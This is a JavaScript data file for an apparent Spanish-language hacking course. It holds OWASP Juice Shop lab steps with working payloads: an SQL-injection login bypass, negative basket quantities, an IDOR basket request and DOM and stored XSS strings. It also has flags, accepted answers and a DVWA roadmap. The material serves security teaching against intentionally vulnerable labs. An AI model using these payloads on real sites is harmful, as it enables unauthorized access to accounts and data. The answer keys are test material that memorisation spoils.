            flagsAceptadas: ["/rest/user/login", "rest/user/login", "user/login", "FLAG{juice-sqli-post-intercepted}"],
            objetivoFlag: 'Ingresa la flag cuando veas en Burp la peticion POST a /rest/user/login con el body JSON conteniendo los campos email y password que enviaste.'
          },
          {
            numero: 2,
            titulo: 'Bypass de autenticacion de Administrador',
            como: `Donde se hace: En el formulario de Login de Juice Shop (con "Intercept is off" en Burp Suite para navegar rápido).

Objetivo: Entrar a la cuenta del Administrador de la tienda sin saber su contraseña, utilizando una inyección SQL.

Paso a paso:
1. Asegúrate de que en Burp Suite esté en "Intercept is off" (o desactiva FoxyProxy temporalmente).
2. En el campo "Email" del formulario de login de Juice Shop, escribe exactamente:
   ' OR 1=1--
3. En el campo "Password", escribe cualquier texto inventado (por ejemplo: abc).
4. Haz clic en el botón "Log in".
5. ¡Listo! La tienda iniciará sesión inmediatamente. En la esquina superior derecha, haz clic en "Account" y verás que estás conectado como:
   admin@juice-sh.op

¿Por qué funciona?: Las dos rayas (--) en SQL representan un comentario, anulando por completo la verificación de contraseña. Y como 1=1 siempre es verdadero, la base de datos devuelve la primera cuenta registrada: el Administrador.`,
            payload: "' OR 1=1--",
            flag: 'FLAG{juice-sqli-admin-login-success}',
            dondeEncontrarla: 'En el menú superior de Juice Shop al hacer clic en Account tras iniciar sesión.',
            quePoner: 'Escribe el correo del administrador con el que iniciaste sesión: admin@juice-sh.op',
            flagsAceptadas: ["admin@juice-sh.op", "admin", "admin@juice-shop.op", "FLAG{juice-sqli-admin-login-success}"],
            objetivoFlag: 'Ingresa la flag cuando Juice Shop te redirija al inicio de sesion exitoso como admin@juice-sh.op, con el nombre "Admin" visible en el menu de usuario superior.'
          }
        ]
      },
      {
        id: 'juice-logic',
        numero: 3,
        titulo: 'Manipulacion de Logica de Negocio',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Capturar peticion de adicion al carrito',
            como: `Donde se hace: En Burp Suite y Firefox.

Objetivo: Capturar el momento en que agregas un producto a la cesta para observar el parámetro de cantidad en la petición JSON.

Paso a paso:
1. Inicia sesión en Juice Shop y ve al catálogo principal de productos.
2. En Burp Suite, activa "Intercept is on".
3. En Juice Shop, haz clic en el botón "Add to Basket" (Añadir a la cesta) de cualquier producto (por ejemplo, Apple Juice).
4. En Burp Suite verás detenida la petición POST /api/BasketItems/ con un cuerpo JSON como:
   {"ProductId":1,"BasketId":"...","quantity":1}`,
            payload: 'POST /api/BasketItems/\n{"ProductId":1,"BasketId":"1","quantity":1}',
            flag: 'FLAG{juice-logic-basket-post-captured}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept tras hacer clic en Add to Basket.',
            quePoner: 'Escribe el valor inicial del parámetro quantity: 1',
            flagsAceptadas: ["1", "quantity: 1", "FLAG{juice-logic-basket-post-captured}"],
            objetivoFlag: 'Ingresa la flag cuando veas en Burp Intercept la peticion POST a /api/BasketItems con el campo "quantity":1 en el body JSON capturado.'
          },
          {
            numero: 2,
            titulo: 'Alterar cantidad a valor negativo',
            como: `Donde se hace: En Burp Suite (en la ventana de Intercept).

Objetivo: Modificar la cantidad a un número negativo para reducir el precio total del carrito y obtener productos gratis.

Paso a paso:
1. Con la petición aún detenida en Burp Suite, cambia el número 1 del campo "quantity": 1 por un número negativo:
   {"ProductId":1,"BasketId":"...","quantity":-5}
2. Haz clic en el botón "Forward" en Burp Suite para enviar la petición modificada.
3. En Firefox, haz clic en el icono del carrito de compras arriba a la derecha.
4. Verás que el producto tiene una cantidad de -5 y el precio total de tu cesta se ha reducido o muestra un saldo a tu favor.

¿Por qué es un fallo de lógica de negocio?: Los desarrolladores validaron las cantidades en los botones de la pantalla, pero olvidaron verificar en el servidor que la cantidad recibida fuera siempre un número entero positivo mayor a cero.`,
            payload: '{"ProductId":1,"BasketId":"1","quantity":-5}',
            flag: 'FLAG{juice-logic-negative-total-achieved}',
            dondeEncontrarla: 'En la vista del carrito de compras de Juice Shop tras alterar quantity a -5.',
            quePoner: 'Escribe el valor negativo que inyectaste: -5',
            flagsAceptadas: ["-5", "$0.00", "0", "FLAG{juice-logic-negative-total-achieved}"],
            objetivoFlag: 'Ingresa la flag cuando el carrito de Juice Shop muestre un total negativo o en $0.00 gracias a la cantidad -5 que enviaste via Burp.'
          }
        ]
      },
      {
        id: 'juice-idor',
        numero: 4,
        titulo: 'Acceso No Autorizado e IDOR',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Localizar endpoint de la cesta',
            como: `Donde se hace: En Firefox y Burp Suite.

Objetivo: Identificar cómo sabe la tienda cuál es tu cesta de compras (observando el número identificador en la URL).

Paso a paso:
1. En Juice Shop, haz clic en el icono del carrito de compras.
2. En Burp Suite, ve a "Proxy" -> "HTTP history" y busca las últimas peticiones realizadas.
3. Localiza la petición GET hacia una ruta como /rest/basket/2 (donde el número final es tu ID de cesta personal).`,
            payload: 'GET /rest/basket/2',
            flag: 'FLAG{juice-idor-basket-endpoint-found}',
            dondeEncontrarla: 'En Burp HTTP history o DevTools Network al abrir la cesta, observando la ruta con ID numérico.',
            quePoner: 'Escribe el nombre del recurso de la API de la cesta: basket (o /rest/basket)',
            flagsAceptadas: ["basket", "/rest/basket", "FLAG{juice-idor-basket-endpoint-found}"],
            objetivoFlag: 'Ingresa la flag cuando identifiques en Burp HTTP history o DevTools Network la peticion GET a /rest/basket/{id} con tu ID de cesta visible en la URL.'
          },
          {
            numero: 2,
            titulo: 'Consultar cesta de otro usuario',
            como: `Donde se hace: En Burp Suite (utilizando la herramienta Repeater).

Objetivo: Cambiar el número de tu cesta por el número de la cesta de otro usuario para ver sus productos privados sin autorización.

Paso a paso:
1. En Burp Suite en "HTTP history", haz clic derecho sobre la petición GET /rest/basket/X y elige "Send to Repeater" (Enviar a Repeater).
2. Ve a la pestaña "Repeater" arriba.
3. En la primera línea, cambia el número de la cesta por el número 1:
   GET /rest/basket/1 HTTP/1.1
4. Haz clic en el botón naranja "Send" (Enviar).
5. En el panel de respuesta a la derecha, verás un JSON con los productos que pertenecen al carrito de otro usuario (la cesta número 1).

¿Qué significa IDOR?: Insecure Direct Object Reference (Referencia Directa Insegura a Objetos). Ocurre cuando una aplicación expone un identificador directo (como un número en la URL) sin verificar si quien lo solicita tiene permiso para verlo.`,
            payload: 'GET /rest/basket/1',
            flag: 'FLAG{juice-idor-other-user-basket-exposed}',
            dondeEncontrarla: 'En la respuesta HTTP en Burp Suite al consultar la cesta con ID 1.',
            quePoner: 'Escribe el número de la cesta ajena que consultaste: 1',
            flagsAceptadas: ["1", "BasketId: 1", "FLAG{juice-idor-other-user-basket-exposed}"],
            objetivoFlag: 'Ingresa la flag cuando la respuesta de /rest/basket/1 te devuelva el JSON con los productos de otra cuenta, confirmando el fallo de autorizacion IDOR.'
          }
        ]
      },
      {
        id: 'juice-xss',
        numero: 5,
        titulo: 'Cross-Site Scripting en SPA',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Inyeccion en la barra de busqueda',
            como: `Donde se hace: En la barra de búsqueda de Juice Shop.

Objetivo: Ejecutar una alerta JavaScript en una aplicación moderna de página única (SPA) a través del campo de búsqueda de productos.

Paso a paso:
1. En la página principal de Juice Shop, haz clic en el icono de la lupa (barra de búsqueda).
2. Copia y pega exactamente este código:
   <iframe src="javascript:alert(\`XSS\`)">
3. Presiona la tecla Enter.
4. Aparecerá en la pantalla un cuadro de alerta emergente con el texto "XSS".

¿Por qué usamos iframe en vez de script?: En aplicaciones modernas creadas con Angular, las etiquetas <script> tradicionales suelen ser bloqueadas automáticamente por el framework, pero etiquetas como <iframe> pueden eludir estos filtros si no están bien saneadas.`,
            payload: '<iframe src="javascript:alert(`XSS`)">',
            flag: 'FLAG{juice-xss-dom-iframe-alert-fired}',
            dondeEncontrarla: 'En la alerta emergente que salta en tu navegador tras presionar Enter en la barra de búsqueda.',
            quePoner: 'Escribe el texto que aparece dentro del cuadro de alerta emergente: XSS',
            flagsAceptadas: ["XSS", "xss", "FLAG{juice-xss-dom-iframe-alert-fired}"],
            objetivoFlag: 'Ingresa la flag cuando el payload iframe dispare el alert en la barra de busqueda de Juice Shop, confirmando la vulnerabilidad DOM XSS en la SPA.'
          },
          {
            numero: 2,
            titulo: 'Inyeccion persistente en resenas de productos',
            como: `Donde se hace: En la sección de reseñas / comentarios de cualquier producto en Juice Shop.

Objetivo: Dejar un comentario con código malicioso que se active automáticamente para cualquier persona que mire el producto.

Paso a paso:
1. Con tu sesión iniciada en Juice Shop, haz clic en la foto de cualquier producto del catálogo para abrir su ficha.
2. Desplázate hacia abajo a la sección "Reviews" (Reseñas) y haz clic en el campo para escribir una nueva reseña.
3. Pega este payload diseñado para burlar el sanitizador:
   <<SCRIPT>alert("XSS");//<</SCRIPT>
4. Haz clic en el botón "Submit" para publicar el comentario.
5. Cierra la ventana y vuelve a hacer clic en el mismo producto: verás que la alerta "XSS" se ejecuta de forma persistente.

¿Por qué funcionó este truco?: El filtro eliminó la palabra <SCRIPT>, pero al haberla duplicado (<<SCRIPT>), al borrar la primera quedó una etiqueta válida de apertura que el navegador ejecutó.`,
            payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>',
            flag: 'FLAG{juice-xss-stored-review-persists}',
            dondeEncontrarla: 'En la sección de Reviews de un producto en Juice Shop tras recargar la página.',
            quePoner: 'Escribe el texto de la alerta ejecutada desde la reseña: XSS',
            flagsAceptadas: ["XSS", "xss", "FLAG{juice-xss-stored-review-persists}"],
            objetivoFlag: 'Ingresa la flag cuando al volver a la pagina del producto (o recargarla) el alert "XSS" se dispare automaticamente desde la resena guardada en la base de datos.'
          }
        ]
      }
    ]
  }
};

export const RUTA_GLOBAL_TEMATICAS = [
  {
    orden: 1,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'juice-recon',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-recon',
    titulo: 'Busqueda de Rutas y Secciones Ocultas',
    categoria: 'Reconocimiento',
    nivel: 'Basico',
    descripcion: 'Aprenderas a revisar el codigo fuente de una pagina para descubrir enlaces ocultos y desbloquear el panel oficial de retos del laboratorio.',
    duracionEstimada: '10 min',
    tags: ['Recon', 'Rutas Ocultas', 'Score Board'],
  },
  {
    orden: 2,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'dvwa-brute-force',
    lab: 'DVWA',
    moduloId: 'dvwa-brute-force',
    titulo: 'Pruebas Automaticas de Contrasenas',
    categoria: 'Autenticacion',
    nivel: 'Basico',
    descripcion: 'Entendras como se prueban miles de contrasenas de forma automatica con programas como Hydra y por que es vital usar claves seguras.',
    duracionEstimada: '15 min',
    tags: ['Hydra', 'Fuerza Bruta', 'Cookies de Sesion'],
  },
  {
    orden: 3,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'dvwa-xss-reflected',
    lab: 'DVWA',
    moduloId: 'dvwa-xss-reflected',
    titulo: 'Inyeccion de Codigo en Formularios (XSS)',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Basico',
    descripcion: 'Aprenderas que ocurre cuando una pagina no revisa lo que escribe el usuario, permitiendo que se ejecute codigo no autorizado en el navegador.',
    duracionEstimada: '15 min',
    tags: ['XSS Reflected', 'JavaScript Injection', 'document.cookie'],
  },
  {
    orden: 4,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'juice-sqli',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-sqli',
    titulo: 'Entrada sin Contrasena (Inyeccion SQL Basica)',
    categoria: 'Inyeccion SQL',
    nivel: 'Basico',
    descripcion: 'Descubriras como un fallo al consultar la base de datos permite iniciar sesion en la cuenta del administrador sin saber su contrasena.',
    duracionEstimada: '15 min',
    tags: ['SQL Injection', 'Auth Bypass', 'API REST', 'SQLite'],
  },
  {
    orden: 5,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-command-injection',
    lab: 'DVWA',
    moduloId: 'dvwa-command-injection',
    titulo: 'Control del Servidor mediante Comandos',
    categoria: 'Command Injection',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas como un formulario mal protegido puede ser manipulado para ejecutar ordenes del sistema directamente en el servidor.',
    duracionEstimada: '20 min',
    tags: ['OS Commands', 'Linux Shell', 'Concatenacion ;'],
  },
  {
    orden: 6,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-sqli',
    lab: 'DVWA',
    moduloId: 'dvwa-sqli',
    titulo: 'Extraccion de Usuarios y Claves Guardadas',
    categoria: 'Inyeccion SQL',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas a consultar informacion privada en la base de datos, obteniendo los nombres de los usuarios y sus contrasenas.',
    duracionEstimada: '25 min',
    tags: ['UNION SELECT', 'ORDER BY', 'MySQL Hash Dump'],
  },
  {
    orden: 7,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-fi',
    lab: 'DVWA',
    moduloId: 'dvwa-fi',
    titulo: 'Lectura de Archivos Confidenciales (LFI)',
    categoria: 'Inclusion de Archivos',
    nivel: 'Intermedio',
    descripcion: 'Veras como explorar las carpetas internas del servidor a traves de la direccion web para leer archivos que deberian ser secretos.',
    duracionEstimada: '20 min',
    tags: ['LFI', 'Directory Traversal', 'php://filter'],
  },
  {
    orden: 8,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-xss-stored',
    lab: 'DVWA',
    moduloId: 'dvwa-xss-stored',
    titulo: 'Codigo Malicioso Permanente (XSS Almacenado)',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Intermedio',
    descripcion: 'Entendras el peligro de guardar comentarios con codigo malicioso que se activa automaticamente cada vez que alguien visita la pagina.',
    duracionEstimada: '20 min',
    tags: ['XSS Stored', 'Persistencia', 'Bypass HTML Client-Side'],
  },
  {
    orden: 9,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-logic',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-logic',
    titulo: 'Modificacion de Precios y Carrito de Compras',
    categoria: 'Logica de Negocio',
    nivel: 'Intermedio',
    descripcion: 'Descubriras como alterar los datos que envia la tienda en segundo plano para cambiar cantidades o conseguir productos gratis.',
    duracionEstimada: '15 min',
    tags: ['Business Logic', 'Manipulacion JSON', 'Burp Repeater'],
  },
  {
    orden: 10,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-idor',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-idor',
    titulo: 'Acceso a Datos de Otras Cuentas (IDOR)',
    categoria: 'Control de Acceso (IDOR)',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas como cambiar un simple numero en la URL para acceder a las cestas y compras de otros usuarios sin autorizacion.',
    duracionEstimada: '15 min',
    tags: ['IDOR', 'Bypass de Autorizacion', 'REST Endpoint'],
  },
  {
    orden: 11,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-xss',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-xss',
    titulo: 'Ataques al Navegador en Aplicaciones Modernas',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Intermedio',
    descripcion: 'Veras como manipular la interfaz visual de una aplicacion moderna para que ejecute acciones invisibles sin que el usuario se de cuenta.',
    duracionEstimada: '20 min',
    tags: ['DOM XSS', 'SPA Injection', 'Iframe Attack'],
  },
  {
    orden: 12,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-upload',
    lab: 'DVWA',
    moduloId: 'dvwa-upload',
    titulo: 'Subida de Archivos y Control del Servidor',
    categoria: 'File Upload / RCE',
    nivel: 'Intermedio',
    descripcion: 'Comprenderas el riesgo de permitir subida de archivos sin verificar su contenido y como un archivo PHP otorga control total del servidor.',
    duracionEstimada: '25 min',
    tags: ['Web Shell', 'Unrestricted File Upload', 'RCE'],
  },
  {
    orden: 13,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-csrf',
    lab: 'DVWA',
    moduloId: 'dvwa-csrf',
    titulo: 'Acciones Forzadas en Cuentas Ajenas (CSRF)',
    categoria: 'Ataques de Sesion (CSRF)',
    nivel: 'Intermedio',
    descripcion: 'Entendras como una pagina trampa puede obligar al navegador de una victima a cambiar su contrasena sin su consentimiento.',
    duracionEstimada: '20 min',
    tags: ['CSRF', 'Session Hijacking', 'Exploit HTML'],
  },
];

export function obtenerRoadmapLab(nombreLab) {
  return ROADMAP_MODULOS[nombreLab] || null;
}

export function obtenerEstadisticasLab(nombreLab, modulos) {
  if (!modulos || modulos.length === 0) {
    return { totalModulos: 0, modulosCompletados: 0, totalPasos: 0, pasosCompletados: 0, porcentaje: 0 };
  }
  let totalPasos = 0;
  let pasosCompletados = 0;
  let modulosCompletados = 0;
  modulos.forEach((mod) => {
    const cantPasos = mod.pasos?.length || 0;
    totalPasos += cantPasos;
    const guardados = obtenerPasosCompletadosModulo(nombreLab, mod.id);
    pasosCompletados += guardados.length;
    if (cantPasos > 0 && guardados.length === cantPasos) {
      modulosCompletados += 1;
    }
  });
  const porcentaje = totalPasos > 0 ? Math.round((pasosCompletados / totalPasos) * 100) : 0;
  return { totalModulos: modulos.length, modulosCompletados, totalPasos, pasosCompletados, porcentaje };
}

const STORAGE_KEY_PREFIX = 'roadmap_pasos_completados_';

export function obtenerPasosCompletadosModulo(nombreLab, moduloId) {
  try {
    const key = `${STORAGE_KEY_PREFIX}${nombreLab}_${moduloId}`;
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

export function alternarPasoModulo(nombreLab, moduloId, pasoIdx) {
  try {
    const key = `${STORAGE_KEY_PREFIX}${nombreLab}_${moduloId}`;
    const actuales = obtenerPasosCompletadosModulo(nombreLab, moduloId);
    let nuevos;
    if (actuales.includes(pasoIdx)) {
      nuevos = actuales.filter((i) => i !== pasoIdx);
    } else {
      nuevos = [...actuales, pasoIdx].sort((a, b) => a - b);
    }
    localStorage.setItem(key, JSON.stringify(nuevos));
    return nuevos;
  } catch {
    return [];
  }
}
